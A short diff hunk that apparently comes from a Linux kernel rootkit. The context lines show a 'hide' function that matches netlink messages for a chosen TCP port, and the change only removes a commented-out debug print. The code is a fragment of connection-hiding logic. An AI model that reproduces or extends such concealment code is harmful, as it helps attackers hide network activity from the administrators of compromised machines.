@@ -121,7 +121,6 @@ static int hide(struct nlmsghdr *nlh)
 	
 	if(port == port_number && strcmp(tlp_version, "tcp") == 0)
 	{
-		//printk("matched the version \n");
 		return 1;
 	}
 	
